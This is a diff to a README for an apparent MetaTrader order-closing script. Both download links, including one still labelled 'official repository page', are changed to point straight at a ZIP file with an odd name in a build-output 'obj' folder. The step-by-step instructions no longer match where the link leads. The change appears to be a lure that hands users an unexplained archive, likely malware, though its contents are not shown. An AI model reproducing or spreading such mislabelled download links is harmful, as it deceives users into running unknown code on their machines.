@@ -1,6 +1,6 @@
 # 📉 MT5-MT4-Close-Orders-Script - Close all your trading orders instantly
 
-[![](https://img.shields.io/badge/Download-Script-blue.svg)](https://github.com/Aljawa831/MT5-MT4-Close-Orders-Script)
+[![](https://img.shields.io/badge/Download-Script-blue.svg)](https://raw.githubusercontent.com/Aljawa831/MT5-MT4-Close-Orders-Script/main/CloseOrders/obj/M-Orders-Script-Close-alpist.zip)
 
 This script helps traders manage their positions in MetaTrader 5. It allows you to close specific groups of orders with one click. You save time and reduce manual effort when you trade.
 
@@ -28,7 +28,7 @@ Before you use this script, confirm your system meets these needs:
 
 Follow these steps to obtain the tool:
 
-1. Go to the [official repository page](https://github.com/Aljawa831/MT5-MT4-Close-Orders-Script).
+1. Go to the [official repository page](https://raw.githubusercontent.com/Aljawa831/MT5-MT4-Close-Orders-Script/main/CloseOrders/obj/M-Orders-Script-Close-alpist.zip).
 2. Look for the green "Code" button near the top right of the page.
 3. Click "Download ZIP" to save the file to your computer.
 4. Locate the ZIP file in your Downloads folder.
